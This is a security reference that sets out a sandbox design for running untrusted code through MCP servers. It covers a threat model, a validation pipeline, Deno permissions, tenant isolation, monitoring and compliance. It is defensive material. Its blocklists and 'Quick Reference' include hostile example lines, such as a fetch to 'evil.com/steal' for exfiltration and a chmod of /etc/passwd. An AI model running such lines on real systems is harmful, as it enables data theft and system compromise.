# MCP Code Execution: Security Architecture

**Type:** Reference / Security
**Status:** Active
**Last Updated:** 2025-11-05
**Verified For:** v0.1.0
**Dependencies:**
- [REFERENCE_MCP_CODE_EXECUTION_COMPREHENSIVE.md](./REFERENCE_MCP_CODE_EXECUTION_COMPREHENSIVE.md) - Core MCP concepts
- [CLAUDE.md](../../CLAUDE.md) - Multi-tenancy requirements

**Purpose:** Define security controls for executing untrusted code through MCP servers safely and compliantly.

---

## Table of Contents
- [Threat Model](#threat-model)
- [Code Validation Pipeline](#code-validation-pipeline)
- [Deno Sandbox Model](#deno-sandbox-model)
- [Resource Limits](#resource-limits)
- [Multi-Tenancy Isolation](#multi-tenancy-isolation)
- [Security Monitoring](#security-monitoring)
- [Compliance Requirements](#compliance-requirements)
- [Pre-Production Checklist](#pre-production-checklist)

---

## Threat Model

### Top 5 Threats & Mitigations

| Threat | Impact | Mitigation | Control |
|--------|--------|-----------|---------|
| **Arbitrary Code Execution** | Critical: Execute malicious code | Sandbox isolation + syntax validation | Deno runtime with no-prompt flag |
| **Data Exfiltration** | Critical: Steal customer data | Network whitelisting + encryption | Disabled fetch() by default |
| **Filesystem Access** | High: Modify/read system files | Permission-based file access control | Only /tmp/mcp readable/writable |
| **Resource Exhaustion** | High: DoS via infinite loops | CPU/memory/timeout limits | 30s timeout, 512MB heap |
| **Privilege Escalation** | High: Run as root/admin | Non-root execution | Node runs as `sandbox` user (UID 1000) |

### Risk Assessment Matrix

```
LIKELIHOOD (Probability of occurrence)
     LOW         MED         HIGH
H
I  ┌─────────┬─────────┬──────────┐
G  │ Priv    │ Resource│ Data     │ H
H  │ Escape  │ Exhaust │ Exfil    │ I
   ├─────────┼─────────┼──────────┤ G
M  │ Import  │ Syntax  │          │ H
E  │ Bypass  │ Bypass  │ Invalid  │
D  ├─────────┼─────────┼──────────┤
   │         │ Pattern │ Code     │ L
L  │         │ Escape  │ Exec     │ O
O  └─────────┴─────────┴──────────┘ W
W
```

**Risk Levels:**
- **CRITICAL:** Arbitrary code execution, data exfiltration, privilege escalation
- **HIGH:** Resource exhaustion, network escape, filesystem breach
- **MEDIUM:** Syntax/import bypasses, invalid code detection
- **LOW:** Logging/monitoring failures

**Acceptance Criteria:**
- CRITICAL risks: 0 exploits in production for 12+ months
- HIGH risks: <0.1% bypass rate in automated testing
- MEDIUM risks: Caught by pre-execution validation
- LOW risks: Monitored and logged

---

## Code Validation Pipeline

### Four-Stage Validation Flow

```
INPUT CODE
    ↓
[1] SYNTAX VALIDATION (TypeScript compilation)
    ├─ Parse as TypeScript
    ├─ Check for compilation errors
    └─ Error: Reject immediately
    ↓
[2] IMPORT VALIDATION (Whitelist enforcement)
    ├─ Extract all import statements
    ├─ Check against allowed paths
    └─ Error: Reject if unauthorized imports
    ↓
[3] PATTERN VALIDATION (Dangerous code detection)
    ├─ Scan for prohibited patterns
    ├─ Check regex against blocklist
    └─ Error: Reject if match found
    ↓
[4] EXECUTION (Safe sandbox runtime)
    ├─ Run in isolated process
    ├─ Enforce resource limits
    └─ Stream results back safely
    ↓
OUTPUT / RESULT
```

### Validation Implementation

```typescript
async function validateCode(code: string): Promise<ValidationResult> {
  const checks = [
    validateSyntax(code),           // Step 1
    validateImports(code),          // Step 2
    validatePatterns(code),         // Step 3
  ];

  const results = await Promise.all(checks);
  return {
    valid: results.every(r => r.valid),
    errors: results.flatMap(r => r.errors),
    warnings: results.flatMap(r => r.warnings)
  };
}
```

### Dangerous Patterns Blocklist

| Pattern | Risk | Regex |
|---------|------|-------|
| `eval()` | Code injection | `/eval\s*\(/` |
| `Function()` | Dynamic code | `/Function\s*\(/` |
| `require()` dynamic | Module bypass | `/require\s*\([^'"]/` |
| `process.exit()` | Escape sandbox | `/process\.exit/` |
| `child_process` | Subprocess spawn | `/child_process/ \| /exec\(/ \| /spawn\(/` |
| `fs.chmod()` | Permission bypass | `/fs\.chmod/ \| /chmod\(/` |
| `__proto__` | Prototype pollution | `/__proto__/` |
| `process.env` | Env variable leak | `/process\.env\[.*\]/` (limited, see whitelist) |
| `global` scope | Global state manipulation | `/globalThis\[.*\]/ \| /global\[.*\]/` |
| `fetch()` external | Network exfil | `/fetch\(['"](https?|ws):/ (unless in whitelist)` |

### Allowed Imports Whitelist

```typescript
const ALLOWED_IMPORT_PATHS = [
  // MCP servers (read-only)
  /^\.\/servers\//,
  /^@mcp\/servers\//,

  // Reusable skills
  /^\.\/skills\//,

  // Official libraries only
  /^@anthropic\//,
  /^@types\//,

  // Explicitly allowed utilities
  /^lodash$/,
  /^date-fns$/,
  /^zod$/,

  // Relative imports within execution scope
  /^\.\/lib\/execution-safe\//,
];
```

### Environment Variable Whitelist

```typescript
// Only these env vars are readable in sandbox
const ALLOWED_ENV_VARS = [
  'NODE_ENV',           // Set to 'production'
  'LOG_LEVEL',          // Control verbosity
  'MCP_EXECUTION_ID',   // Unique execution identifier
  'CUSTOMER_ID',        // Tenant context (encrypted)
];

// Explicitly blocked
const BLOCKED_ENV_VARS = [
  'OPENAI_API_KEY',     // Never expose API keys
  'SUPABASE_SERVICE_ROLE_KEY',
  'DATABASE_URL',       // No direct DB access
  'STRIPE_SECRET_KEY',  // Never expose secrets
];
```

---

## Deno Sandbox Model

### Execution Command

```bash
deno run \
  --allow-read=/tmp/mcp \
  --allow-write=/tmp/mcp \
  --allow-env=NODE_ENV,LOG_LEVEL,MCP_EXECUTION_ID,CUSTOMER_ID \
  --allow-sys=osMemoryInfo,osLoadAvg \
  --no-prompt \
  /tmp/mcp/execution-EXEC_ID.ts
```

### Permission Breakdown

| Permission | Granted | Denied | Rationale |
|-----------|---------|--------|-----------|
| **Read** | `/tmp/mcp/` only | All other paths | Execution results only |
| **Write** | `/tmp/mcp/` only | System files | Temp output storage |
| **Env** | 4 vars (whitelist) | All others | Prevent secret leaks |
| **Net** | ❌ DENIED | All network | Use MCP tools instead |
| **Run** | ❌ DENIED | All processes | No subprocess spawn |
| **Ffi** | ❌ DENIED | All FFI calls | No system library access |
| **Plugin** | ❌ DENIED | All plugins | Single runtime only |
| **Hrtime** | ⚠️ LIMITED | Sub-microsecond | Prevent timing attacks |

### Execution Lifecycle

```typescript
// 1. Write validated code to temp file
const execPath = `/tmp/mcp/execution-${execId}.ts`;
await Deno.writeTextFile(execPath, validatedCode);

// 2. Set strict permissions
const permissions = {
  read: ['/tmp/mcp'],
  write: ['/tmp/mcp'],
  env: ['NODE_ENV', 'LOG_LEVEL', 'MCP_EXECUTION_ID', 'CUSTOMER_ID'],
  net: false,
  run: false,
  ffi: false,
  plugin: false,
};

// 3. Execute with timeout
const timeout = 30_000; // 30 seconds
const process = Deno.run({
  cmd: ['deno', 'run', '--allow-read=/tmp/mcp', ...permFlags, execPath],
  stdout: 'piped',
  stderr: 'piped',
});

// 4. Enforce timeout + cleanup
const result = await Promise.race([
  processCompletion(process),
  timeout_promise(timeout)
    .catch(() => { process.kill('SIGTERM'); throw TimeoutError; })
]);

// 5. Delete temp files
await Deno.remove(execPath);
```

### What's NOT Allowed

```bash
# ❌ Network access (no fetch, no DNS)
deno run --allow-net executor.ts  # FORBIDDEN

# ❌ Subprocess execution (no spawn/exec)
deno run --allow-run executor.ts  # FORBIDDEN

# ❌ Filesystem write outside /tmp/mcp
deno run --allow-write=/etc executor.ts  # FORBIDDEN

# ❌ Plugin loading
deno run --allow-plugin executor.ts  # FORBIDDEN

# ❌ Foreign function interface
deno run --allow-ffi executor.ts  # FORBIDDEN
```

---

## Resource Limits

### Execution Constraints

| Resource | Limit | Enforcement | Action on Exceeded |
|----------|-------|-------------|-------------------|
| **CPU Time** | 30 seconds | `deno run --timeout 30000` | SIGTERM (graceful), then SIGKILL |
| **Memory** | 512MB | `NODE_OPTIONS="--max-old-space-size=512"` | Heap allocation failure → Error |
| **Temp Disk** | 100MB | Quota on `/tmp/mcp` | write() fails with ENOSPC |
| **File Handles** | 100 | ulimit in container | open() fails with EMFILE |
| **Network Requests** | 0 | Permission denied | fetch() throws NetworkError |
| **Process Count** | 1 | No `run` permission | exec() throws PermissionError |

### Memory Profile

```typescript
// Monitor during execution
const checkMemory = setInterval(async () => {
  const memStatus = await Deno.memoryUsage();

  if (memStatus.heapUsed > 512 * 1024 * 1024) {
    console.error('MEMORY_LIMIT_EXCEEDED');
    Deno.exit(1);  // Force exit
  }

  // Warning at 80%
  if (memStatus.heapUsed > 409.6 * 1024 * 1024) {
    console.warn('Memory at 80% limit, suggest optimizations');
  }
}, 500);  // Check every 500ms
```

### Timeout Enforcement (Graceful Degradation)

```typescript
const executeWithTimeout = async (code: string, timeoutMs: number) => {
  const timeoutPromise = new Promise((_, reject) =>
    setTimeout(() => reject(new TimeoutError('Execution exceeded timeout')), timeoutMs)
  );

  try {
    return await Promise.race([
      executeCode(code),
      timeoutPromise
    ]);
  } catch (e) {
    if (e instanceof TimeoutError) {
      // Log timeout event
      await logSecurityEvent({
        type: 'TIMEOUT',
        executionId: execId,
        duration: timeoutMs,
        customerId: tenantId
      });

      // Attempt graceful cleanup
      await killProcess(processId, 'SIGTERM');
      await new Promise(r => setTimeout(r, 1000));  // Wait 1s

      // Force kill if still alive
      await killProcess(processId, 'SIGKILL');

      throw TimeoutError;
    }
    throw e;
  }
};
```

---

## Multi-Tenancy Isolation

### Tenant Context Injection

```typescript
// Before executing code, inject customer context
const executionContext = {
  customerId: req.customer.id,         // Encrypted in env
  tenantDomain: req.customer.domain,   // Verified domain
  executionId: v4(),                   // Unique execution ID
  requestId: req.id,                   // Trace to API call
  timestamp: Date.now(),               // Audit timestamp
};

// Code receives context via environment only
const tenantAwareCode = `
import { MCP_EXECUTION_ID, CUSTOMER_ID } from 'env';

// Use execution ID to scope all operations
const getCustomerData = async (key: string) => {
  // Can only access data for this execution's customer
  const result = await callMCPTool('query_data', {
    executionId: MCP_EXECUTION_ID,
    customerId: CUSTOMER_ID,
    key: key
  });
  return result;
};
`;
```

### Row-Level Security Enforcement

```sql
-- MCP_EXECUTION table enforces tenant isolation
CREATE TABLE mcp_executions (
  id UUID PRIMARY KEY,
  customer_id UUID NOT NULL REFERENCES customer_configs(id),
  execution_id VARCHAR(36) UNIQUE,
  code_hash BYTEA NOT NULL,
  status VARCHAR(20),
  created_at TIMESTAMP DEFAULT NOW(),

  CONSTRAINT mcp_execution_customer
    CHECK (customer_id IS NOT NULL)
);

-- RLS policy: Users see only their executions
ALTER TABLE mcp_executions ENABLE ROW LEVEL SECURITY;

CREATE POLICY "execution_isolation" ON mcp_executions
  AS RESTRICTIVE
  USING (customer_id = current_user.customer_id);
```

### Credential Isolation

```typescript
// Credentials are NEVER passed to execution environment
const executeUntrustedCode = async (code: string, customerId: UUID) => {
  // ❌ WRONG: Passing WooCommerce credentials
  // const context = {
  //   woocommerce_key: customer.woocommerce_key  // FORBIDDEN
  // };

  // ✅ CORRECT: Pass execution context, credentials stay server-side
  const context = {
    customerId: customerId,
    executionId: v4(),
  };

  // Code must call MCP tools to access customer data
  // MCP validates that execution can only access its own customer's data
  const result = await executeInSandbox(code, context);
};

// MCP tools validate tenant context before returning data
const woocommerce_get_products = async (
  context: ExecutionContext,
  filters: ProductFilter
) => {
  // Verify execution can access this customer's data
  if (context.customerId !== DB.getExecutionOwner(context.executionId)) {
    throw new AuthorizationError('Cannot access this customer');
  }

  // Use server-side credentials (customer never sees them)
  const products = await getWooCommerceProducts(
    context.customerId,
    filters
  );

  return products;
};
```

### Execution Scope Boundaries

```
┌─────────────────────────────────────────────────────┐
│                    MCP Server (Server-side)         │
│  ✅ Has access to:                                  │
│  • Customer WooCommerce credentials                 │
│  • Customer Shopify tokens                          │
│  • Database encryption keys                         │
│  • All customer data                                │
└──────────────────────┬──────────────────────────────┘
                       │
                   MCP Tools
                   (Validated)
                       │
┌──────────────────────▼──────────────────────────────┐
│             Untrusted Code (Sandbox)                │
│  ❌ CANNOT access:                                  │
│  • Any credentials                                  │
│  • Raw customer data                                │
│  • Other customers' data                            │
│  • Filesystem (except /tmp/mcp)                     │
│  • Network (except MCP tools)                       │
│                                                      │
│  ✅ CAN access:                                     │
│  • MCP tool results (customer-scoped)               │
│  • Temp filesystem (/tmp/mcp)                       │
│  • Own execution context                            │
│  • Limited environment variables                    │
└─────────────────────────────────────────────────────┘
```

---

## Security Monitoring

### Loggable Security Events

```typescript
interface SecurityEvent {
  timestamp: ISO8601;
  type: SecurityEventType;
  executionId: string;
  customerId: UUID;
  severity: 'INFO' | 'WARN' | 'ERROR' | 'CRITICAL';
  details: object;
}

enum SecurityEventType {
  // Validation events
  SYNTAX_ERROR = 'SYNTAX_ERROR',
  IMPORT_BLOCKED = 'IMPORT_BLOCKED',
  PATTERN_DETECTED = 'PATTERN_DETECTED',
  VALIDATION_PASSED = 'VALIDATION_PASSED',

  // Execution events
  EXECUTION_STARTED = 'EXECUTION_STARTED',
  EXECUTION_COMPLETED = 'EXECUTION_COMPLETED',
  EXECUTION_TIMEOUT = 'EXECUTION_TIMEOUT',
  EXECUTION_ERROR = 'EXECUTION_ERROR',

  // Resource events
  MEMORY_WARNING = 'MEMORY_WARNING',
  MEMORY_EXCEEDED = 'MEMORY_EXCEEDED',
  DISK_QUOTA_EXCEEDED = 'DISK_QUOTA_EXCEEDED',
  FILE_HANDLE_LIMIT = 'FILE_HANDLE_LIMIT',

  // Isolation events
  TENANT_BOUNDARY_VIOLATION = 'TENANT_BOUNDARY_VIOLATION',
  UNAUTHORIZED_MCP_CALL = 'UNAUTHORIZED_MCP_CALL',
  PERMISSION_DENIED = 'PERMISSION_DENIED',

  // Anomaly events
  SUSPICIOUS_PATTERN = 'SUSPICIOUS_PATTERN',
  REPEATED_FAILURES = 'REPEATED_FAILURES',
  RATE_LIMIT_EXCEEDED = 'RATE_LIMIT_EXCEEDED',
}
```

### Alert Triggers

| Condition | Alert Level | Action | SLA |
|-----------|------------|--------|-----|
| PATTERN_DETECTED | CRITICAL | Block execution, notify security | <1 min |
| TENANT_BOUNDARY_VIOLATION | CRITICAL | Kill execution, audit log, notify | <1 min |
| MEMORY_EXCEEDED | HIGH | Terminate gracefully, log | <5 min |
| 5+ validation failures / hour | HIGH | Rate limit, require review | <15 min |
| TIMEOUT 3+ times / day | MEDIUM | Flag account for optimization | <1 hour |
| REPEATED_FAILURES | MEDIUM | Alert customer support | <1 hour |

### Monitoring Query (Example)

```sql
-- Alert: 5+ validation failures in past hour
SELECT
  customer_id,
  COUNT(*) as failure_count,
  MAX(timestamp) as latest
FROM security_events
WHERE
  type IN ('SYNTAX_ERROR', 'IMPORT_BLOCKED', 'PATTERN_DETECTED')
  AND timestamp > NOW() - INTERVAL '1 hour'
  AND severity IN ('WARN', 'ERROR')
GROUP BY customer_id
HAVING COUNT(*) >= 5
ORDER BY failure_count DESC;

-- Alert: Timeout pattern
SELECT
  customer_id,
  COUNT(*) as timeout_count,
  AVG(EXTRACT(EPOCH FROM duration)) as avg_seconds
FROM security_events
WHERE
  type = 'EXECUTION_TIMEOUT'
  AND timestamp > NOW() - INTERVAL '1 day'
GROUP BY customer_id
HAVING COUNT(*) >= 3
ORDER BY timeout_count DESC;
```

### Incident Response Procedure

```
ALERT TRIGGERED
    ↓
[1] IMMEDIATE (< 1 minute)
    ├─ Log event with full context
    ├─ Notify on-call security engineer (Slack)
    └─ Kill execution if still running
    ↓
[2] INVESTIGATION (< 15 minutes)
    ├─ Retrieve execution logs
    ├─ Analyze code that triggered alert
    ├─ Check if pattern is known/benign
    └─ Document findings
    ↓
[3] RESPONSE (< 1 hour)
    ├─ If malicious: Block execution, customer notification
    ├─ If benign: Add to whitelist, update patterns
    ├─ If false positive: Improve detection
    └─ Update playbook
    ↓
[4] REMEDIATION (< 24 hours)
    ├─ Deploy detection improvements
    ├─ Run audit on historical executions
    └─ Close incident
```

---

## Compliance Requirements

### PCI DSS (Payment Card Industry)

| Requirement | Control | Verification |
|-------------|---------|--------------|
| 1.1.3 - Code Review | All code validated before execution | Validation report generated |
| 2.2.4 - Security Config | Deno permissions locked, no defaults | Permissions JSON audit |
| 6.5.1 - Injection Prevention | Pattern blocklist + AST parsing | Test suite with injection attempts |
| 8.2.3 - Strong Auth | Execution context validated | Audit log of context verification |
| 10.3.6 - Audit Trail | All executions logged | Security_events table >365 day retention |

**Audit Evidence:**
- Validation reports (automated)
- Security event logs (timestamped)
- Code pattern test results
- Permission configuration snapshots

### GDPR (Data Protection)

| Requirement | Control | Implementation |
|-------------|---------|-----------------|
| **Article 32** - Security | Encryption, access control, monitoring | All data encrypted in transit/at rest |
| **Article 5** - Minimization | Only necessary data in execution context | Customer ID only, no sensitive data |
| **Article 17** - Right to Delete | Audit trail cleanup | Delete security_events after 1 year |
| **Article 6** - Lawful Basis | Customer consent required | ToS acceptance before code execution |
| **Article 47** - DPA Compliance | Processor agreement with Deno/sandbox provider | Contract on file |

**Compliance Evidence:**
- Data Processing Agreement (signed)
- Encryption certificate audit
- Retention policy documentation
- Consent records (audit log)

### Security Baseline Standards

**NIST Cybersecurity Framework:**
- **Identify:** Execution threat model documented
- **Protect:** Sandboxing + validation + RBAC
- **Detect:** Security event logging + alerting
- **Respond:** Incident response procedures
- **Recover:** Process kill + cleanup

**CIS Controls:**
- 2.1: Inventory + control of software
- 3.1: Data recovery capabilities
- 4.1: Code review (validation pipeline)
- 6.1: Security testing in software dev
- 8.1: Audit logging

---

## Pre-Production Checklist

### Security Validation (Pass/Fail)

- [ ] **Sandbox Runtime**
  - [ ] Deno permissions validated (test: attempt to read `/etc/passwd`)
  - [ ] Resource limits enforced (test: run 1 minute, should timeout at 30s)
  - [ ] Temp directory isolation verified (test: can't write outside `/tmp/mcp`)

- [ ] **Code Validation Pipeline**
  - [ ] Syntax validation catches invalid TypeScript (test: inject bad syntax)
  - [ ] Import blocklist works (test: try to import 'fs')
  - [ ] Pattern detection triggers (test: inject `eval()`)
  - [ ] All 10 patterns in blocklist are tested

- [ ] **Tenant Isolation**
  - [ ] Customer A execution can't see Customer B data (integration test)
  - [ ] Env vars are tenant-scoped (test: access CUSTOMER_ID, verify correctness)
  - [ ] RLS policies block cross-tenant access (DB test)
  - [ ] MCP tools validate execution ownership (test: attempt to spoof executionId)

- [ ] **Compliance**
  - [ ] Security event logs contain all required fields
  - [ ] Log retention policy set (1 year for GDPR)
  - [ ] Encryption in transit enabled (TLS 1.2+)
  - [ ] Encryption at rest enabled (database, temp files)

- [ ] **Monitoring & Alerting**
  - [ ] Alert triggers fire on test events
  - [ ] On-call rotation configured
  - [ ] Playbooks documented and tested
  - [ ] Dashboard shows execution trends

### Performance Validation (Baseline Metrics)

- [ ] **Cold Start Time:** < 5 seconds (p95)
- [ ] **Validation Overhead:** < 500ms per execution
- [ ] **Memory Efficiency:** < 300MB per sandbox instance
- [ ] **Throughput:** Support 10 concurrent executions minimum

### Automated Test Coverage (Minimum Requirements)

```typescript
// Test file: __tests__/security/mcp-sandbox.test.ts
describe('MCP Sandbox Security', () => {
  // Injection tests
  test('blocks eval() patterns', ...);
  test('blocks Function() constructor', ...);
  test('blocks child_process', ...);

  // Isolation tests
  test('prevents filesystem write outside /tmp/mcp', ...);
  test('prevents network access', ...);
  test('prevents env var exfiltration', ...);

  // Multi-tenancy tests
  test('customer A cannot access customer B data', ...);
  test('RLS policies enforce tenant boundaries', ...);

  // Resource tests
  test('execution times out after 30s', ...);
  test('memory limit kills process at 512MB', ...);

  // Compliance tests
  test('security events logged for audit', ...);
  test('pattern detection works for OWASP top 10', ...);
});
```

### Deployment Readiness

- [ ] Code review passed (2+ reviewers)
- [ ] Security audit completed (external review)
- [ ] Load test completed (10 concurrent executions)
- [ ] Rollback plan documented
- [ ] On-call engineer briefed
- [ ] Monitoring dashboard live
- [ ] Alert routing verified
- [ ] Customer communication drafted (if public feature)

### Go-Live Sign-Off

```
┌─────────────────────────────────────┐
│ SECURITY SIGN-OFF                   │
├─────────────────────────────────────┤
│ ✅ All tests passing                │
│ ✅ Threat model reviewed            │
│ ✅ Compliance verified              │
│ ✅ Monitoring operational           │
│ ✅ Team trained                     │
└─────────────────────────────────────┘

Approved by: [Security Lead] ________
Date: ____________
Version: 0.1.0
```

---

## Quick Reference: Dangerous Patterns

```typescript
// ❌ BLOCKED PATTERNS

eval('code')                                    // Code injection
new Function('return this')(...)                // Dynamic code
require('../' + userInput)                      // Dynamic requires
process.exit(0)                                 // Sandbox escape
child_process.exec('command')                   // Subprocess
child_process.spawn('cmd', [args])              // Subprocess
fs.chmod('/etc/passwd', 0o777)                  // Permission bypass
Object.defineProperty(Object, '__proto__', ...) // Prototype pollution
globalThis['HACK'] = evil                       // Global state
process.env['SECRET'] = hack                    // Env variable leak
fetch('https://evil.com/steal')                 // Exfiltration
```

---

**Last Review:** 2025-11-05
**Next Security Review:** 2025-12-05 (monthly)
**Owner:** Security Team
**Escalation:** security@omniops.co.uk
